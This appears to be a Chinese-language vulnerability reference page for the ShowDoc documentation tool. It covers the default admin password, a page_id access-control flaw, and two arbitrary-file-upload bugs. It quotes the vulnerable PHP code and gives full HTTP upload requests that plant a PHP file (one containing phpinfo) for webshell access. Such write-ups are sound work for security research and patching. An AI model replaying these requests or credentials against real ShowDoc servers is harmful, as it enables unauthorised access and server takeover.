官网

- https://github.com/star7th/showdoc
- https://www.showdoc.com.cn/

## 弱口令

The default admin account is Username: showdoc Password: 123456


## 越权修改文章

ShowDoc 2.4.1版本中存在安全漏洞。远程攻击者可借助被修改的‘page_id’参数利用该漏洞修改用户的笔记。

参考：

https://github.com/CCCCCrash/POCs/tree/master/Web/showdoc/IncorrectAccessControl


## 后台任意文件上传

showdoc < 2.6.7

- [showdoc的api_page存在任意文件上传getshell](https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/)

https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L258

```
//上传附件
    public function upload(){
        $login_user = $this->checkLogin();
        $item_id = I("item_id/d") ? I("item_id/d") : 0 ;
        $page_id = I("page_id/d") ? I("page_id/d") : 0 ;
        $uploadFile = $_FILES['file'] ;
 
        if (!$page_id) {
            $this->sendError(10103,"请至少先保存一次页面内容");
            return;
        }
        if (!$this->checkItemPermn($login_user['uid'] , $item_id)) {
            $this->sendError(10103);
            return;
        }
        
        if (!$uploadFile) {
           return false;
        }
        
        if (strstr(strip_tags(strtolower($_FILES['editormd-image-file']['name'])), ".php") ) {
            return false;
        }

        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4145728000 ;// 设置附件上传大小
        $upload->rootPath = './../Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->uploadOne($uploadFile) ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = get_domain().__ROOT__.substr($upload->rootPath,1).$info['savepath'].$info['savename'] ;
          $insert = array(
            "uid" => $login_user['uid'],
            "item_id" => $item_id,
            "page_id" => $page_id,
            "display_name" => $uploadFile['name'],
            "file_type" => $uploadFile['type'],
            "file_size" => $uploadFile['size'],
            "real_url" => $url,
            "addtime" => time(),
            );
          $ret = D("UploadFile")->add($insert);

          echo json_encode(array("url"=>$url,"success"=>1));
        }

    }
```
相比 https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L212 的uploadImg() 有过滤,附件上传upload()没有任何过滤.可以直接上传shell。

burp的post数据大致如下：
```
POST /show/server/index.php?s=/api/page/upload HTTP/1.1

------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="page_id"

22
------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="item_id"

3
------WebKitFormBoundaryzOQywSoNbAALAwKn
Content-Disposition: form-data; name="file"; filename="cs.php"
Content-Type: image/png

�PNG
�
------WebKitFormBoundaryzOQywSoNbAALAwKn--
```

## 前台任意文件上传

showdoc <= 2.8.6

- https://github.com/star7th/showdoc/pull/1059


``\server\Application\Home\Controller\PageController.class.php``第150行
```
$upload->allowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
```
``$upload->allowExts`` 不是 ``Think\Upload`` 类的正确用法，导致文件后缀限制失效

并且方法里面没有进行``$this->checkLogin();``导致未登录上传文件，即前台gethell

上传图片，并抓包，将文件名改为1.<>php

```
POST /index.php?s=home/page/uploadImg HTTP/1.1
Host: xxx
Content-Length: 737
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybPJ8Ipbf21wUTVHA
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9

------WebKitFormBoundarybPJ8Ipbf21wUTVHA
Content-Disposition: form-data; name="editormd-image-file"; filename="1.<>php"
Content-Type: image/jpeg

<?php
phpinfo;

------WebKitFormBoundarybPJ8Ipbf21wUTVHA--
```
